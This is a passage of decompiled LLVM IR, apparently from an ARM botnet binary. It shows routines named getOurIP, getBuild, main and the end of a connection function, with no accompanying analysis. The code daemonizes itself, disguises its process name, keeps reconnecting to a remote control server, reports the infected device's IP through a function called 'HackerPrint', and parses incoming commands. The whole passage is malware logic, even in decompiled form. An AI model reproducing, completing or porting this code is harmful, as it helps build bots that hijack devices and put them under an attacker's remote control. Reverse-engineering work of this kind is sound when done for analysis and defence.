  br i1 %v3_1000c6fc, label %dec_label_pc_1000c720, label %dec_label_pc_1000c704

dec_label_pc_1000c704:                            ; preds = %entry
  store i32 268486420, i32* @lr, align 4
  %v1_1000c710 = call i32 @__libc_close(i32 %v3_1000c6f8)
  store i32 0, i32* @global_var_1002aba8.30, align 4
  br label %dec_label_pc_1000c720

dec_label_pc_1000c720:                            ; preds = %entry, %dec_label_pc_1000c704
  %v3_1000c724 = load i32, i32* @global_var_1002ab68.538, align 4
  %v3_1000c728 = icmp eq i32 %v3_1000c724, 0
  br i1 %v3_1000c728, label %dec_label_pc_1000c730, label %dec_label_pc_1000c740

dec_label_pc_1000c730:                            ; preds = %dec_label_pc_1000c720
  br label %dec_label_pc_1000c754

dec_label_pc_1000c740:                            ; preds = %dec_label_pc_1000c720
  %v1_1000c748 = add i32 %v3_1000c724, 1
  br label %dec_label_pc_1000c754

dec_label_pc_1000c754:                            ; preds = %dec_label_pc_1000c730, %dec_label_pc_1000c740
  %storemerge = phi i32 [ 0, %dec_label_pc_1000c730 ], [ %v1_1000c748, %dec_label_pc_1000c740 ]
  store i32 %storemerge, i32* @global_var_1002ab68.538, align 4
  %v1_1000c768 = mul i32 %storemerge, 4
  %v2_1000c76c = add i32 %v1_1000c768, ptrtoint ([16 x i8]** @global_var_1002ab58.540 to i32)
  %v1_1000c770 = inttoptr i32 %v2_1000c76c to i32*
  %v2_1000c770 = load i32, i32* %v1_1000c770, align 4
  %v2_1000c77c = inttoptr i32 %v2_1000c770 to i8*
  %v3_1000c77c = call i32 @strcpy(i32 %v2_1000c6dc, i8* %v2_1000c77c)
  %v3_1000c784 = load i32, i32* @global_var_1002ab5c.541, align 4
  store i32 %v2_1000c6dc, i32* @r3, align 4
  store i32 268486556, i32* @lr, align 4
  %v2_1000c798 = call i32 @__GI_strchr(i32 %v2_1000c6dc, i32 58)
  %v3_1000c7a0 = icmp eq i32 %v2_1000c798, 0
  br i1 %v3_1000c7a0, label %dec_label_pc_1000c7f0, label %dec_label_pc_1000c7a8

dec_label_pc_1000c7a8:                            ; preds = %dec_label_pc_1000c754
  store i32 %v2_1000c6dc, i32* @r3, align 4
  store i32 268486584, i32* @lr, align 4
  %v2_1000c7b4 = call i32 @__GI_strchr(i32 %v2_1000c6dc, i32 58)
  %v1_1000c7bc = add i32 %v2_1000c7b4, 1
  store i32 268486600, i32* @lr, align 4
  %v2_1000c7c4 = call i32 @atol(i32 %v1_1000c7bc, i32 %v2_1000c7b4)
  store i32 %v2_1000c6dc, i32* @r3, align 4
  store i32 268486624, i32* @lr, align 4
  %v2_1000c7dc = call i32 @__GI_strchr(i32 %v2_1000c6dc, i32 58)
  %v3_1000c7ec = inttoptr i32 %v2_1000c7dc to i8*
  store i8 0, i8* %v3_1000c7ec, align 1
  br label %dec_label_pc_1000c7f0

dec_label_pc_1000c7f0:                            ; preds = %dec_label_pc_1000c754, %dec_label_pc_1000c7a8
  %stack_var_-4136.0 = phi i32 [ %v3_1000c784, %dec_label_pc_1000c754 ], [ %v2_1000c7c4, %dec_label_pc_1000c7a8 ]
  store i32 268486656, i32* @lr, align 4
  %v3_1000c7fc = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_1000c7fc, i32* @global_var_1002aba8.30, align 4
  store i32 268486700, i32* @lr, align 4
  %v5_1000c828 = call i32 @connectTimeout(i32 %v3_1000c7fc, i32 %v2_1000c6dc, i32 %stack_var_-4136.0, i32 30, i32 %v2_1000c6dc)
  %v3_1000c830 = icmp eq i32 %v5_1000c828, 0
  %. = zext i1 %v3_1000c830 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v2_1000c6dc, { 1, 0, 3, 2, 5, 4, 7, 6, 8, 9 }
  uselistorder i32 (i32, i32)* @atol, { 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 33, 32, 31, 30, 29, 28, 27, 26 }
  uselistorder i32 47, { 1, 0 }
  uselistorder label %dec_label_pc_1000c7f0, { 1, 0 }
  uselistorder label %dec_label_pc_1000c754, { 1, 0 }
  uselistorder label %dec_label_pc_1000c720, { 1, 0 }
}

define i32 @getOurIP(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-46 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-4160 = alloca i8, align 1
  %stack_var_-4164 = alloca i32, align 4
  %stack_var_-4180 = alloca i32, align 4
  %stack_var_-4196 = alloca i32, align 4
  store i32 268486800, i32* @lr, align 4
  %v3_1000c88c = call i32 @socket(i32 2, i32 2, i32 0)
  %v4_1000c8a0 = icmp eq i32 %v3_1000c88c, -1
  br i1 %v4_1000c8a0, label %dec_label_pc_1000c8a8, label %dec_label_pc_1000c8b4

dec_label_pc_1000c8a8:                            ; preds = %entry
  br label %dec_label_pc_1000cae0

dec_label_pc_1000c8b4:                            ; preds = %entry
  %v2_1000c8b4 = ptrtoint i32* %stack_var_-4196 to i32
  store i32 2, i32* %stack_var_-4196, align 4
  store i32 268486892, i32* @lr, align 4
  %v2_1000c8e8 = call i32 @inet_addr(i32 ptrtoint ([8 x i8]* @global_var_10018e78.542 to i32))
  store i32 53, i32* @r3, align 4
  %v1_1000c8f8 = call i32 @htons(i32 53)
  store i32 268486936, i32* @lr, align 4
  %v3_1000c914 = call i32 @__libc_connect(i32 %v3_1000c88c, i32 %v2_1000c8b4, i32 16)
  %v4_1000c928 = icmp eq i32 %v3_1000c914, -1
  br i1 %v4_1000c928, label %dec_label_pc_1000c930, label %dec_label_pc_1000c93c

dec_label_pc_1000c930:                            ; preds = %dec_label_pc_1000c8b4
  br label %dec_label_pc_1000cae0

dec_label_pc_1000c93c:                            ; preds = %dec_label_pc_1000c8b4
  store i32 16, i32* %stack_var_-4164, align 4
  %v2_1000c944 = ptrtoint i32* %stack_var_-4180 to i32
  %v2_1000c948 = ptrtoint i32* %stack_var_-4164 to i32
  store i32 268487004, i32* @lr, align 4
  %v4_1000c958 = call i32 @__GI_getsockname(i32 %v3_1000c88c, i32 %v2_1000c944, i32 %v2_1000c948, i32 %v2_1000c948)
  %v4_1000c96c = icmp eq i32 %v4_1000c958, -1
  br i1 %v4_1000c96c, label %dec_label_pc_1000c974, label %dec_label_pc_1000c980

dec_label_pc_1000c974:                            ; preds = %dec_label_pc_1000c93c
  br label %dec_label_pc_1000cae0

dec_label_pc_1000c980:                            ; preds = %dec_label_pc_1000c93c
  store i32 268487072, i32* @lr, align 4
  %v3_1000c99c = call i32 @__libc_open(i32 ptrtoint ([16 x i8]* @global_var_10018e80.543 to i32), i32 0)
  %v2_1000ca20 = ptrtoint i8* %stack_var_-4160 to i32
  br label %dec_label_pc_1000ca20

dec_label_pc_1000c9ac:                            ; preds = %dec_label_pc_1000ca20
  store i32 268487104, i32* @lr, align 4
  %v5_1000c9bc = call i32 @strstr(i32 %v2_1000ca20, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10018e90.544, i32 0, i32 0), i32 268566528)
  %v3_1000c9c4 = icmp eq i32 %v5_1000c9bc, 0
  br i1 %v3_1000c9c4, label %dec_label_pc_1000ca08, label %dec_label_pc_1000c9e4.preheader

dec_label_pc_1000c9e4.preheader:                  ; preds = %dec_label_pc_1000c9ac
  %v2_1000c9e810 = load i8, i8* %stack_var_-4160, align 1
  %v3_1000c9f014 = icmp eq i8 %v2_1000c9e810, 9
  br i1 %v3_1000c9f014, label %dec_label_pc_1000c9f8, label %dec_label_pc_1000c9d8

dec_label_pc_1000c9d8:                            ; preds = %dec_label_pc_1000c9e4.preheader, %dec_label_pc_1000c9d8
  %v4_1000c9e415 = phi i32 [ %v1_1000c9dc, %dec_label_pc_1000c9d8 ], [ %v2_1000ca20, %dec_label_pc_1000c9e4.preheader ]
  %v1_1000c9dc = add i32 %v4_1000c9e415, 1
  %v5_1000c9e0 = inttoptr i32 %v1_1000c9dc to i8*
  %v2_1000c9e8 = load i8, i8* %v5_1000c9e0, align 1
  %v3_1000c9f0 = icmp eq i8 %v2_1000c9e8, 9
  br i1 %v3_1000c9f0, label %dec_label_pc_1000c9f8, label %dec_label_pc_1000c9d8

dec_label_pc_1000c9f8:                            ; preds = %dec_label_pc_1000c9d8, %dec_label_pc_1000c9e4.preheader
  %storemerge4.lcssa = phi i8* [ %stack_var_-4160, %dec_label_pc_1000c9e4.preheader ], [ %v5_1000c9e0, %dec_label_pc_1000c9d8 ]
  store i8 0, i8* %storemerge4.lcssa, align 1
  br label %dec_label_pc_1000ca40

dec_label_pc_1000ca08:                            ; preds = %dec_label_pc_1000c9ac
  store i32 268487200, i32* @lr, align 4
  %v3_1000ca1c = call i32 @__GI_memset(i32 %v2_1000ca20, i32 0, i32 4096)
  br label %dec_label_pc_1000ca20

dec_label_pc_1000ca20:                            ; preds = %dec_label_pc_1000c980, %dec_label_pc_1000ca08
  %v3_1000ca30 = call i32 @fdgets(i32 %v2_1000ca20, i32 4096, i32 %v3_1000c99c)
  %v3_1000ca38 = icmp eq i32 %v3_1000ca30, 0
  br i1 %v3_1000ca38, label %dec_label_pc_1000ca40, label %dec_label_pc_1000c9ac

dec_label_pc_1000ca40:                            ; preds = %dec_label_pc_1000ca20, %dec_label_pc_1000c9f8
  store i32 268487240, i32* @lr, align 4
  %v1_1000ca44 = call i32 @__libc_close(i32 %v3_1000c99c)
  %v3_1000ca48 = load i8, i8* %stack_var_-4160, align 1
  %v3_1000ca50 = icmp eq i8 %v3_1000ca48, 0
  br i1 %v3_1000ca50, label %dec_label_pc_1000cad4, label %dec_label_pc_1000ca58

dec_label_pc_1000ca58:                            ; preds = %dec_label_pc_1000ca40
  %v2_1000ca58 = ptrtoint i32* %stack_var_-64 to i32
  %v3_1000ca68 = call i32 @strcpy(i32 %v2_1000ca58, i8* nonnull %stack_var_-4160)
  store i32 ptrtoint (i32* @global_var_1000ca88.545 to i32), i32* @lr, align 4
  %v3_1000ca84 = call i32 @ioctl(i32 %v3_1000c88c, i32 35111, i32 %v2_1000ca58)
  %v2_1000ca9c = ptrtoint i32* %stack_var_-46 to i32
  br label %dec_label_pc_1000ca94

dec_label_pc_1000ca94:                            ; preds = %dec_label_pc_1000ca58, %dec_label_pc_1000ca94
  %storemerge58 = phi i32 [ 0, %dec_label_pc_1000ca58 ], [ %v1_1000cac0, %dec_label_pc_1000ca94 ]
  %v2_1000caa4 = add i32 %storemerge58, %v2_1000ca9c
  %v1_1000caa8 = inttoptr i32 %v2_1000caa4 to i8*
  %v2_1000caa8 = load i8, i8* %v1_1000caa8, align 1
  %v4_1000cab8 = add i32 %storemerge58, ptrtoint (i32* @global_var_1002abb8.546 to i32)
  %v5_1000cab8 = inttoptr i32 %v4_1000cab8 to i8*
  store i8 %v2_1000caa8, i8* %v5_1000cab8, align 1
  %v1_1000cac0 = add nuw nsw i32 %storemerge58, 1
  %tmp37 = icmp slt i32 %v1_1000cac0, 6
  br i1 %tmp37, label %dec_label_pc_1000ca94, label %dec_label_pc_1000cad4

dec_label_pc_1000cad4:                            ; preds = %dec_label_pc_1000ca94, %dec_label_pc_1000ca40
  store i32 ptrtoint (i32* @global_var_1000cadc.547 to i32), i32* @lr, align 4
  %v1_1000cad8 = call i32 @__libc_close(i32 %v3_1000c88c)
  br label %dec_label_pc_1000cae8

dec_label_pc_1000cae0:                            ; preds = %dec_label_pc_1000c974, %dec_label_pc_1000c930, %dec_label_pc_1000c8a8
  br label %dec_label_pc_1000cae8

dec_label_pc_1000cae8:                            ; preds = %dec_label_pc_1000cad4, %dec_label_pc_1000cae0
  %stack_var_-20.0 = phi i32 [ 0, %dec_label_pc_1000cae0 ], [ %tmp, %dec_label_pc_1000cad4 ]
  ret i32 %stack_var_-20.0

; uselistorder directives
  uselistorder i32 %storemerge58, { 2, 1, 0 }
  uselistorder i32 %v1_1000c9dc, { 1, 0 }
  uselistorder i32 %v2_1000ca20, { 3, 1, 0, 2 }
  uselistorder i32 %v3_1000c88c, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-4164, { 1, 0 }
  uselistorder i8* %stack_var_-4160, { 2, 4, 0, 1, 3 }
  uselistorder i8 9, { 1, 0, 2 }
  uselistorder i32 (i32)* @htons, { 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 15, 2, 1, 0 }
  uselistorder label %dec_label_pc_1000cae8, { 1, 0 }
  uselistorder label %dec_label_pc_1000ca94, { 1, 0 }
  uselistorder label %dec_label_pc_1000ca20, { 1, 0 }
  uselistorder label %dec_label_pc_1000c9d8, { 1, 0 }
}

define i32 @getBuild() local_unnamed_addr {
entry:
  store i32 268487464, i32* @lr, align 4
  %v4_1000cb24 = call i32 @access(i32 ptrtoint ([16 x i8]* @global_var_10018e9c.548 to i32), i32 0, i32 268566528)
  %v4_1000cb30 = icmp eq i32 %v4_1000cb24, -1
  %. = select i1 %v4_1000cb30, i32 ptrtoint ([7 x i8]* @global_var_10018eb4.550 to i32), i32 ptrtoint ([7 x i8]* @global_var_10018eac.549 to i32)
  ret i32 %.
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8** %argv to i32
  %stack_var_-5252 = alloca i32, align 4
  %stack_var_-5212 = alloca i32, align 4
  %stack_var_-4188 = alloca i32, align 4
  %stack_var_-5320 = alloca i32, align 4
  %stack_var_-5256 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  store i32 268487604, i32* @lr, align 4
  %v4_1000cbb0 = call i32 @access(i32 ptrtoint ([16 x i8]* @global_var_10018e9c.548 to i32), i32 0, i32 268566528)
  %v4_1000cbbc = icmp eq i32 %v4_1000cbb0, -1
  %. = select i1 %v4_1000cbbc, i32 ptrtoint ([19 x i8]* @global_var_10018ec8.553 to i32), i32 ptrtoint ([5 x i8]* @global_var_10018ec0.552 to i32)
  store i32 268487652, i32* @lr, align 4
  %v0_1000cbe0 = call i32 @geteuid()
  %v3_1000cbe8 = icmp eq i32 %v0_1000cbe0, 0
  br i1 %v3_1000cbe8, label %dec_label_pc_1000cbf0, label %dec_label_pc_1000cbfc

dec_label_pc_1000cbf0:                            ; preds = %entry
  store i32 0, i32* @global_var_1002ab64.554, align 4
  br label %dec_label_pc_1000cbfc

dec_label_pc_1000cbfc:                            ; preds = %entry, %dec_label_pc_1000cbf0
  store i32 268487680, i32* @lr, align 4
  %v0_1000cbfc = call i32 @getBuild()
  store i32 268487692, i32* @lr, align 4
  %v0_1000cc08 = call i32 @getBuild()
  %v3_1000cc14 = load i32, i32* @global_var_1002abd0.248, align 4
  store i32 %v3_1000cc14, i32* %stack_var_-80, align 4
  store i32 268487720, i32* @lr, align 4
  %v3_1000cc24 = call i32 @__GI_inet_ntoa(i32* nonnull %stack_var_-80, i32 ptrtoint (i32* @global_var_10030000.1 to i32))
  %v0_1000cc34 = load i32, i32* @r29, align 4
  %v1_1000cc34 = inttoptr i32 %v0_1000cc34 to i8*
  %v1_1000cc38 = inttoptr i32 %v3_1000cc24 to i8*
  %v9_1000cc40 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_10018edc.555, i32 0, i32 0), i8* %v1_1000cc34, i8* %v1_1000cc38)
  %v1_1000cc48 = bitcast i8** %argv to i32*
  %v2_1000cc48 = load i32, i32* %v1_1000cc48, align 4
  store i32 %v2_1000cc48, i32* @r3, align 4
  %v0_1000cc5c = call i32 @__GI_strlen()
  store i32 ptrtoint (i32* @global_var_10018ebc.551 to i32), i32* @r4, align 4
  store i32 268487800, i32* @lr, align 4
  %v3_1000cc74 = call i32 @strncpy(i32 %v2_1000cc48, i32 ptrtoint (i32* @global_var_10018ebc.551 to i32), i32 %v0_1000cc5c)
  %v3_1000cc7c = load i32, i32* %v1_1000cc48, align 4
  store i32 %v3_1000cc7c, i32* @r3, align 4
  store i32 268487824, i32* @lr, align 4
  %v4_1000cc8c = load i32, i32* @r6, align 4
  %v5_1000cc8c = call i32 @sprintf(i32 %v3_1000cc7c, i32 %., i32 %tmp, i32 %v4_1000cc8c)
  store i32 ptrtoint ([3 x i8]* @global_var_1000ccb0.556 to i32), i32* @lr, align 4
  %v5_1000ccac = call i32 @prctl(i32 15, i32 %., i32 0, i32 0, i32 0)
  store i32 268487864, i32* @lr, align 4
  %v1_1000ccb4 = call i32 @__GI_time(i32 0)
  store i32 268487872, i32* @lr, align 4
  %v0_1000ccbc = call i32 @__libc_getpid()
  %v2_1000ccc4 = xor i32 %v1_1000ccb4, %v0_1000ccbc
  store i32 ptrtoint ([3 x i8]* @global_var_1000ccd0.557 to i32), i32* @lr, align 4
  %v1_1000cccc = call i32 @srand(i32 %v2_1000ccc4)
  store i32 268487896, i32* @lr, align 4
  %v1_1000ccd4 = call i32 @__GI_time(i32 0)
  store i32 268487904, i32* @lr, align 4
  %v0_1000ccdc = call i32 @__libc_getpid()
  %v2_1000cce4 = xor i32 %v1_1000ccd4, %v0_1000ccdc
  %v1_1000ccec = call i32 @init_rand(i32 %v2_1000cce4)
  store i32 ptrtoint (i32* @global_var_1000ccf4.558 to i32), i32* @lr, align 4
  %v1_1000ccf0 = call i32 @getOurIP(i32 %v1_1000ccec)
  store i32 268487928, i32* @lr, align 4
  %v0_1000ccf4 = call i32 @__libc_fork()
  %v3_1000cd04 = icmp eq i32 %v0_1000ccf4, 0
  br i1 %v3_1000cd04, label %dec_label_pc_1000cd34, label %dec_label_pc_1000cd28

dec_label_pc_1000cd28:                            ; preds = %dec_label_pc_1000cbfc
  %v2_1000cd0c = ptrtoint i32* %stack_var_-5256 to i32
  store i32 ptrtoint ([3 x i8]* @global_var_1000cd20.559 to i32), i32* @lr, align 4
  %v3_1000cd1c = call i32 @__libc_waitpid(i32 %v0_1000ccf4, i32 %v2_1000cd0c, i32 0)
  %v0_1000cd24 = call i32 @__GI_exit()
  br label %dec_label_pc_1000cd54

dec_label_pc_1000cd34:                            ; preds = %dec_label_pc_1000cbfc
  store i32 268487992, i32* @lr, align 4
  %v0_1000cd34 = call i32 @__libc_fork()
  %v3_1000cd44 = icmp eq i32 %v0_1000cd34, 0
  br i1 %v3_1000cd44, label %dec_label_pc_1000cd54, label %dec_label_pc_1000cd4c

dec_label_pc_1000cd4c:                            ; preds = %dec_label_pc_1000cd34
  %v0_1000cd50 = call i32 @__GI_exit()
  br label %dec_label_pc_1000cd54

dec_label_pc_1000cd54:                            ; preds = %dec_label_pc_1000cd28, %dec_label_pc_1000cd34, %dec_label_pc_1000cd4c
  store i32 268488024, i32* @lr, align 4
  %v0_1000cd54 = call i32 @__GI_setsid()
  store i32 ptrtoint ([3 x i8]* @global_var_1000cd64.562 to i32), i32* @lr, align 4
  %v2_1000cd60 = call i32 @chdir(i32 ptrtoint (i32* @global_var_10018eec.561 to i32), i32 268566528)
  store i32 ptrtoint (i32* @global_var_1000cd70.563 to i32), i32* @lr, align 4
  %v2_1000cd6c = call i32 @__bsd_signal(i32 13, i32 1)
  %v2_1000d5b0 = ptrtoint i32* %stack_var_-4188 to i32
  %v4_1000d5c0 = bitcast i32* %stack_var_-4188 to i8*
  %v2_1000d0c8 = ptrtoint i32* %stack_var_-5320 to i32
  %v1_1000d1d8 = or i32 %v2_1000d5b0, 1
  %v2_1000d36c = ptrtoint i32* %stack_var_-5212 to i32
  %v2_1000d578 = add i32 %v2_1000d0c8, 68
  br label %dec_label_pc_1000cd74

dec_label_pc_1000cd74:                            ; preds = %dec_label_pc_1000cd84, %dec_label_pc_1000d5a8, %dec_label_pc_1000cd54
  %v0_1000cd74 = call i32 @initConnection()
  %v3_1000cd7c = icmp eq i32 %v0_1000cd74, 0
  br i1 %v3_1000cd7c, label %dec_label_pc_1000cd90, label %dec_label_pc_1000cd84

dec_label_pc_1000cd84:                            ; preds = %dec_label_pc_1000cd74
  store i32 268488076, i32* @lr, align 4
  %v1_1000cd88 = call i32 @sleep(i32 5)
  br label %dec_label_pc_1000cd74

dec_label_pc_1000cd90:                            ; preds = %dec_label_pc_1000cd74
  %v3_1000cd9c = load i32, i32* @global_var_1002abd0.248, align 4
  store i32 %v3_1000cd9c, i32* %stack_var_-80, align 4
  store i32 268488112, i32* @lr, align 4
  %v3_1000cdac = call i32 @__GI_inet_ntoa(i32* nonnull %stack_var_-80, i32 ptrtoint (i32* @global_var_10030000.1 to i32))
  store i32 268488120, i32* @lr, align 4
  %v0_1000cdb4 = call i32 @getBuild()
  %v0_1000cdbc = load i32, i32* @r29, align 4
  store i32 ptrtoint (i32* @global_var_1000cde0.566 to i32), i32* @lr, align 4
  %v6_1000cddc = call i32 @HackerPrint(i32 %v0_1000cdbc, i32 ptrtoint (i32* @global_var_10018ef0.564 to i32), i32 %v3_1000cdac)
  br label %dec_label_pc_1000d5a8

dec_label_pc_1000ce00:                            ; preds = %dec_label_pc_1000d0b4, %dec_label_pc_1000d058
  %v1_1000ce04 = mul i32 %storemerge13, 4
  %v3_1000ce10 = load i32, i32* @global_var_1002abdc.40, align 4
  %v2_1000ce14 = add i32 %v3_1000ce10, %v1_1000ce04
  %v1_1000ce18 = inttoptr i32 %v2_1000ce14 to i32*
  %v2_1000ce18 = load i32, i32* %v1_1000ce18, align 4
  store i32 268488236, i32* @lr, align 4
  %v3_1000ce28 = call i32 @__libc_waitpid(i32 %v2_1000ce18, i32 0, i32 1)
  %tmp95 = icmp slt i32 %v3_1000ce28, 1
  br i1 %tmp95, label %dec_label_pc_1000d04c, label %dec_label_pc_1000ce90

dec_label_pc_1000ce48:                            ; preds = %dec_label_pc_1000ce90, %dec_label_pc_1000ced8
  %v1_1000ce4c = mul i32 %v1_1000ce3c, 4
  %v3_1000ce58 = load i32, i32* @global_var_1002abdc.40, align 4
  %v2_1000ce5c = add i32 %v3_1000ce58, %v1_1000ce4c
  %v1_1000ce60 = add i32 %v2_1000ce5c, -4
  %v1_1000ce7c = inttoptr i32 %v2_1000ce5c to i32*
  %v2_1000ce7c = load i32, i32* %v1_1000ce7c, align 4
  %v2_1000ce80 = inttoptr i32 %v1_1000ce60 to i32*
  store i32 %v2_1000ce7c, i32* %v2_1000ce80, align 4
  br label %dec_label_pc_1000ce90

dec_label_pc_1000ce90:                            ; preds = %dec_label_pc_1000ce00, %dec_label_pc_1000ce48
  %storemerge19 = phi i32 [ %v1_1000ce3c, %dec_label_pc_1000ce48 ], [ %storemerge13, %dec_label_pc_1000ce00 ]
  %v1_1000ce3c = add i32 %storemerge19, 1
  %v2_1000ceb8 = load i32, i32* @global_var_1002abb0.38, align 4
  %v3_1000ced0 = icmp eq i32 %v2_1000ceb8, 0
  br i1 %v3_1000ced0, label %dec_label_pc_1000ced8, label %dec_label_pc_1000ce48

dec_label_pc_1000ced8:                            ; preds = %dec_label_pc_1000ce90
  %v3_1000cebc = load i32, i32* @global_var_1002abb4.39, align 4
  %v3_1000cef0 = icmp ugt i32 %v3_1000cebc, %v1_1000ce3c
  br i1 %v3_1000cef0, label %dec_label_pc_1000ce48, label %dec_label_pc_1000cef8

dec_label_pc_1000cef8:                            ; preds = %dec_label_pc_1000ced8
  %v1_1000cefc = mul i32 %v1_1000ce3c, 4
  %v3_1000cf08 = load i32, i32* @global_var_1002abdc.40, align 4
  %v2_1000cf0c = add i32 %v1_1000cefc, -4
  %v1_1000cf10 = add i32 %v2_1000cf0c, %v3_1000cf08
  %v2_1000cf18 = inttoptr i32 %v1_1000cf10 to i32*
  store i32 0, i32* %v2_1000cf18, align 4
  %v3_1000cf24 = load i32, i32* @global_var_1002abb4.39, align 4
  %v2_1000cf28 = load i32, i32* @global_var_1002abb0.38, align 4
  %v1_1000cf2c = add i32 %v3_1000cf24, -1
  %v2_1000cf2c = icmp ne i32 %v3_1000cf24, 0
  %v2_1000cf30 = zext i1 %v2_1000cf2c to i32
  %v3_1000cf30 = add i32 %v2_1000cf28, -1
  %v4_1000cf30 = add i32 %v3_1000cf30, %v2_1000cf30
  store i32 %v4_1000cf30, i32* @global_var_1002abb0.38, align 4
  store i32 %v1_1000cf2c, i32* @global_var_1002abb4.39, align 4
  %v1_1000cf60 = mul i32 %v1_1000cf2c, 4
  %v1_1000cf68 = add i32 %v1_1000cf60, 4
  store i32 268488564, i32* @lr, align 4
  %v1_1000cf70 = call i32 @malloc(i32 %v1_1000cf68)
  br label %dec_label_pc_1000cfc8

dec_label_pc_1000cf88:                            ; preds = %dec_label_pc_1000cfc8, %dec_label_pc_1000d010
  %v1_1000cf8c = mul i32 %storemerge18, 4
  %v2_1000cf98 = add i32 %v1_1000cf8c, %v1_1000cf70
  %v3_1000cfac = load i32, i32* @global_var_1002abdc.40, align 4
  %v2_1000cfb0 = add i32 %v3_1000cfac, %v1_1000cf8c
  %v1_1000cfb4 = inttoptr i32 %v2_1000cfb0 to i32*
  %v2_1000cfb4 = load i32, i32* %v1_1000cfb4, align 4
  %v2_1000cfb8 = inttoptr i32 %v2_1000cf98 to i32*
  store i32 %v2_1000cfb4, i32* %v2_1000cfb8, align 4
  %v1_1000cfc0 = add i32 %storemerge18, 1
  br label %dec_label_pc_1000cfc8

dec_label_pc_1000cfc8:                            ; preds = %dec_label_pc_1000cef8, %dec_label_pc_1000cf88
  %storemerge18 = phi i32 [ 0, %dec_label_pc_1000cef8 ], [ %v1_1000cfc0, %dec_label_pc_1000cf88 ]
  %v2_1000cff0 = load i32, i32* @global_var_1002abb0.38, align 4
  %v3_1000d008 = icmp eq i32 %v2_1000cff0, 0
  br i1 %v3_1000d008, label %dec_label_pc_1000d010, label %dec_label_pc_1000cf88

dec_label_pc_1000d010:                            ; preds = %dec_label_pc_1000cfc8
  %v3_1000cff4 = load i32, i32* @global_var_1002abb4.39, align 4
  %v3_1000d028 = icmp ugt i32 %v3_1000cff4, %storemerge18
  br i1 %v3_1000d028, label %dec_label_pc_1000cf88, label %dec_label_pc_1000d030

dec_label_pc_1000d030:                            ; preds = %dec_label_pc_1000d010
  %v3_1000d034 = load i32, i32* @global_var_1002abdc.40, align 4
  store i32 268488768, i32* @lr, align 4
  %v1_1000d03c = call i32 @free(i32 %v3_1000d034)
  store i32 %v1_1000cf70, i32* @global_var_1002abdc.40, align 4
  br label %dec_label_pc_1000d04c

dec_label_pc_1000d04c:                            ; preds = %dec_label_pc_1000ce00, %dec_label_pc_1000d030
  %v1_1000d050 = add i32 %storemerge13, 1
  br label %dec_label_pc_1000d058

dec_label_pc_1000d058:                            ; preds = %dec_label_pc_1000d5a8, %dec_label_pc_1000d04c
  %storemerge13 = phi i32 [ %v1_1000d050, %dec_label_pc_1000d04c ], [ 0, %dec_label_pc_1000d5a8 ]
  %tmp97 = icmp slt i32 %storemerge13, 0
  %v1_1000d05c = zext i1 %tmp97 to i32
  %v2_1000d05c = ashr i32 %storemerge13, 31
  %v3_1000d05c = and i32 %v2_1000d05c, -2
  %v4_1000d05c = or i32 %v3_1000d05c, %v1_1000d05c
  %v2_1000d084 = load i32, i32* @global_var_1002abb0.38, align 4
  %v3_1000d088 = load i32, i32* @global_var_1002abb4.39, align 4
  %v3_1000d09c = icmp ugt i32 %v2_1000d084, %v4_1000d05c
  br i1 %v3_1000d09c, label %dec_label_pc_1000ce00, label %dec_label_pc_1000d0a4

dec_label_pc_1000d0a4:                            ; preds = %dec_label_pc_1000d058
  %v4_1000d09c = icmp eq i32 %v2_1000d084, %v4_1000d05c
  br i1 %v4_1000d09c, label %dec_label_pc_1000d0b4, label %dec_label_pc_1000d0c4

dec_label_pc_1000d0b4:                            ; preds = %dec_label_pc_1000d0a4
  %v3_1000d0bc = icmp ugt i32 %v3_1000d088, %storemerge13
  br i1 %v3_1000d0bc, label %dec_label_pc_1000ce00, label %dec_label_pc_1000d0c4

dec_label_pc_1000d0c4:                            ; preds = %dec_label_pc_1000d0a4, %dec_label_pc_1000d0b4
  %v2_1000d0cc = add i32 %v5_1000d5c0, %v2_1000d0c8
  %v3_1000d0d4 = add i32 %v2_1000d0cc, 1132
  %v4_1000d0d4 = inttoptr i32 %v3_1000d0d4 to i8*
  store i8 0, i8* %v4_1000d0d4, align 1
  %v1_1000d0e0 = call i32 @trim(i32 %v2_1000d5b0)
  store i32 268488952, i32* @lr, align 4
  %v5_1000d0f4 = call i32 @strstr(i32 %v2_1000d5b0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10016314.31, i32 0, i32 0), i32 268500992)
  %v4_1000d100 = icmp eq i32 %v5_1000d0f4, %v2_1000d5b0
  br i1 %v4_1000d100, label %dec_label_pc_1000d108, label %dec_label_pc_1000d128

dec_label_pc_1000d108:                            ; preds = %dec_label_pc_1000d0c4
  %v3_1000d10c = load i32, i32* @global_var_1002aba8.30, align 4
  store i32 ptrtoint (i32* @global_var_1000d124.568 to i32), i32* @lr, align 4
  %v4_1000d120 = call i32 @HackerPrint(i32 %v3_1000d10c, i32 ptrtoint ([5 x i8]* @global_var_10018f3c.567 to i32), i32 268566528)
  br label %dec_label_pc_1000d5a8

dec_label_pc_1000d128:                            ; preds = %dec_label_pc_1000d0c4
  store i32 268489020, i32* @lr, align 4
  %v5_1000d138 = call i32 @strstr(i32 %v2_1000d5b0, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10018f44.569, i32 0, i32 0), i32 268566528)
  %v4_1000d144 = icmp eq i32 %v5_1000d138, %v2_1000d5b0
  br i1 %v4_1000d144, label %dec_label_pc_1000d14c, label %dec_label_pc_1000d154

dec_label_pc_1000d14c:                            ; preds = %dec_label_pc_1000d128
  %v0_1000d150 = call i32 @__GI_exit()
  br label %dec_label_pc_1000d154

